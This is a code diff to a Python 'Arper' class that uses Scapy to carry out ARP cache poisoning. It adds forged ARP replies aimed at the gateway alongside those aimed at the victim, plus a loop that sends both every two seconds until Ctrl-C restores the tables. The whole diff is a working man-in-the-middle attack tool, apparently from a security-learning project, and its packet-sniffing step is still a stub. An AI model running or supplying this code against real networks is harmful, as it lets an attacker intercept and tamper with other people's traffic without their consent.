@@ -47,6 +47,7 @@ class Arper:
         self, sniff_thread.start()
 
     def poison(self):
+        print("\nPoison victim handler ")
         poison_victim = ARP()
         poison_victim.op = 2
         poison_victim.psrc = self.gateway
@@ -59,6 +60,35 @@ class Arper:
         print(f'mac src: {poison_victim.hwsrc}')
         print(poison_victim.summary())
         print('-' * 30)
+
+        print("\nPoison gateway handler ")
+        poison_gateway = ARP()
+        poison_gateway.op = 2
+        poison_gateway.psrc = self.victim
+        poison_gateway.pdst = self.gateway
+        poison_gateway.hwdst = self.gateway_mac
+
+        print(f'ip src: {poison_gateway.psrc}')
+        print(f'ip dst: {poison_gateway.pdst}')
+        print(f'mac dst: {poison_gateway.hwdst}')
+        print(f'mac src: {poison_gateway.hwsrc}')
+        print(poison_gateway.summary())
+        print('-' * 30)
+
+        print("\nBeggining the ARP poison. [CTRL-C to stop]")
+
+        while True:
+            sys.stdout.write('.')
+            sys.stdout.flush()
+
+            try:
+                send(poison_victim)
+                send(poison_gateway)
+            except KeyboardInterrupt:
+                self.restore()
+                sys.exit()
+            else:
+                time.sleep(2)
 
     def sniff(self, count=200):
         pass
